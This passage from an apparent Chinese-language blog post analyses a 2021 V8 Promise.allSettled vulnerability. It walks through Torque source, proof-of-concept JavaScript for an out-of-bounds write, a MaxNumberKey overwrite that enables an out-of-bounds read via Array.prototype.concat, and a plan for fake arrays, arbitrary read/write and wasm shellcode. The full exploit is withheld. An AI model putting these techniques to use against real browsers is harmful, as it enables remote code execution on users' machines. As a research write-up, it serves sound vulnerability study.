                                      kPromiseAllResolveElementValuesArraySlot]);
        const oldElements = UnsafeCast(valuesArray.elements);
        const oldCapacity = oldElements.length_intptr;
        const newCapacity = SmiUntag(index);
        if (oldCapacity (
              resolveElementContext[PromiseAllResolveElementContextSlots::
                                        kPromiseAllResolveElementValuesArraySlot]);
          Call(nativeContext, UnsafeCast(resolve), Undefined, valuesArray);
        }
      //Print("WTF!");
      // Return resultCapability.[[Promise]].
      return promise;
    }
PerformPromiseAll的代码比较长，是对传入的参数进行迭代，并对其中的每一个元素都调用了promiseResolve，具体的可以看看源码，最后的Promise.allSettled的返回值那个promise是这里返回的，而那个array是promise-all-element-closure.tq 中处理的。
    transitioning macro PromiseAllResolveElementClosure(
        implicit context: Context)(
        value: JSAny, function: JSFunction, wrapResultFunctor: F): JSAny {
    [ ... ]
      // Update the value depending on whether Promise.all or
      // Promise.allSettled is called.
      const updatedValue = wrapResultFunctor.Call(nativeContext, value);
      // Determine the index from the {function}.
      // Check if we need to grow the [[ValuesArray]] to store {value} at {index}.
      const valuesArray = UnsafeCast(
          context[PromiseAllResolveElementContextSlots::
                      kPromiseAllResolveElementValuesArraySlot]);
      const elements = UnsafeCast(valuesArray.elements);
      const valuesLength = Convert(valuesArray.length);
      if (index (newLength);
          elements.objects[index] = updatedValue;//将对应promisefulfilled或reject后的返回值写入array
        } else
          deferred {
          //Print('3');
            // We need to grow the backing store to fit the {index} as well.
            const newElementsLength = IntPtrMin(
                CalculateNewElementsCapacity(newLength),
                kPropertyArrayHashFieldMax + 1);
            assert(index (newLength);
          }
      }
      let remainingElementsCount =
          UnsafeCast(context[PromiseAllResolveElementContextSlots::
                                      kPromiseAllResolveElementRemainingSlot]);
      remainingElementsCount = remainingElementsCount - 1;
      //Print('remainingElementsCount in all-element ',remainingElementsCount);
      context[PromiseAllResolveElementContextSlots::
                  kPromiseAllResolveElementRemainingSlot] = remainingElementsCount;
      if (remainingElementsCount == 0) {   //当remainingElementsCount为0时返回array
      //Print('return array');
        const capability = UnsafeCast(
            context[PromiseAllResolveElementContextSlots::
                        kPromiseAllResolveElementCapabilitySlot]);
        const resolve = UnsafeCast(capability.resolve);
        Call(context, resolve, Undefined, valuesArray);   //返回array
      }
      return Undefined;
    }
## 一些细节
**0**
关于poc，我们声明完上面的class之后，用Reflect来调用allsettled，这样就能传入MyCls了，我初步写的，其中的reflect是重点，要说明的是这里对于reflect的用法和我的最终版本有些差别，不过我思路写的足够详细，各位可以自己动手尝试。
    class MyCls{
      constructor(executor){
        executor(custom_resolve,custom_reject);
      }
      static resolve(){
        return{
          then:(fulfill, reject)=>{
            console.log("call fulfill");
            fulfill();
            console.log("call reject");
            reject();
          }
        }
      }
    }
    // var arr = Reflect.construcst(MyCls,[function (reject,resolve){resolve()}],Promise);
    var arr = Promise.allSettled([Reflect.apply(MyCls.resolve,Promise,[1])]);
**1**
我们能写进去的只能是object的地址显然最后一位都是1，因此有些debug下的检查会导致abort，需要手动注释，另外我们不能像下面这样。
    Promise.allSettled(b)
    .then(arr => {
       arr[0x10000] = 1;
       %DebugPrint(arr);
     });
来改变返回的arr的map，因为这里的then其实是对allSettled的返回的Promise的操作，而这个Promise是allSettled完成之后才会返回的，所以在这里并不能接收到提前返回的arr，我们应该在custom_resolve中更改arr，因为这里我们才可以接收到提前返回的arr。
    function custom_resolve(arr){
      console.log("custom_resolve called");
      arr[0x10000] = 1;
      // %DebugPrint(arr);
    }
    function custom_reject(){
      console.log("custom_reject called");
    }
可以看到这里assert没过去。
    macro UnsafeCast(implicit context: Context)(o: Object):
        A {
      //Print(o);
      assert(Is(o));
      return %RawDownCast(o);
    }
这个assert只有在debug版本下才有，如同DCHECK，所以为了调试将assert去掉，除此之外还有很多检查，只要是只有debug版本才有的都可以注释掉。
在越界写后，导致一些信息被修改，最后无法寻址arr的相关信息，一旦print等操作就会crash，应该是写到了错误的地方导致的，我们应该仔细看下对应的内存布局
  * FixedArray
  * NumberDictionary
还可以对照下面的图来看这个布局，经观察发现是在deleted字段中写入了一个obj地址，导致在print时一直向后访问最终访问到非法地址导致crash，我们需要控制一下，在我上面写的版本中只有在写入第1/2和最后一个promise时才会调用custom_resolve，我们在第一二次时将其改为NumberDictionary会写到delete字段。
所以 **我们** **不能在resolve里改**
，联系到我们可以在resolve中提前得到array，通过一个全局变量把arr取出来，就能实现任意时刻我们都可以改，那么剩下的就是需要在别处设计一个定时，从而在确定时机完成修改，我选择在reject和fulfilled处加上count，在对应的调用次数时再修改。
**3**
在NumberDictionary中有个元数据用得到最后一位，当MaxNumberKey最后一位为1时，意味着没有特殊元素，而其本身表示最大有效索引，但是因为其并不代表length，所以无论我们将其覆盖成多大的值都无法得到一个越界数组，但是它的另一个含义为我们带来的别的思路，最后一位映射的特殊元素包括get。
    let arr = []
    arr[0x10000] = 1
    Object.defineProperty(arr, 0, {
      get : () => {
        console.log("getter called")
        return 1
      }
    })
如果我们给他声明了一个get操作，但之后又用obj的地址将MaxNumberKey最后一位覆盖，那么在进入IterateElements中的判断时会误认为没有get操作，从而在其后的回调中改变len得以成功，于是会越界读取，此IterateElement是下面的一个内置函数中的内容，我们可以看下有get这个特殊元素的布局为。
正常情况下是
**4**
把目光放向内置函数，有一个能帮助我们越界读的内置函数。
Array.prototype.concat是array的一个内置函数，是用来合并两个array的，所以在这个过程中会对数组中的数据进行遍历，我们并不是为了让俩数组合并才用的这个调用，单纯是利用这里可以助我们越界读，所以我们可以利用concat中的回调，在其中改变数组长度，比如原本0x200的buffer我们在concat的回调中将其改为0x10，如此一来，就会把越界读取的数据全存在返回的数组里。
左边的标号和右边的源码是对应着的，首先我们前面的写MaxNumberKey，使得能bypass这里的HasOnlySimpleElements检查，然后在循环迭代时，先走下面的else分支，触发GetElement回调，从而改变len。
    Object.defineProperty(oob_arr, 0, {
        get : () => {
          print("=== getter called ===");
          victim_arr.length = 0x10;   // 在回调函数中修改数组长度
          gc();
          return 1;
        }
    });
    let a = oob_arr.concat(victim_arr);
成功修改MaxNumberKey，那么我们只需在victim_arr后面布置一下有特殊数值的arraybuffer，然后读出就可以得到偏移。
**5**
### 剩下的思路
  * 通过越界读，也就是通过前面的concat返回的数组，搜索出一个arrayBuffer的backing store地址，这点上面有提到，可以通过一些标记值减去相应偏移获得。
  * 在这个ArrayBuffer里面伪造一个假的double Array，通过在arraybuffer里面布局达到，此时这个double array的地址也是已知。
  * 通过越界读，可以得到这个伪造array的引用，具体来说就是因为有arrayBuffer的backing store地址，所以我们可以得到fake array的地址，然后我们将这个地址以浮点数形式写在内存中，触发越界读，这样读取到这个地址时将越界读到的值返回给一个变量，这个变量就能直接操控fake array，从而得到fake array的引用，这里我觉得是最妙的一点。
  * 通过这个给fake array的赋值，以及从oob array处读取，以及从oob array处对其赋值，可以完成arb r/w。
  * 写shellcode到wasm里，并调用。
这里剩下的就是调偏移布局让读到arraybuffer，体力活，不再展示，由于一些原因，构造poc的过程代码和完成代码就都不贴了，看完以上应该可以自己构造出来。
以上就是对这次21年bh上一个绝妙的利用手法的分析复现
## 参考
 （这是漏洞作者本人的记录）
* * *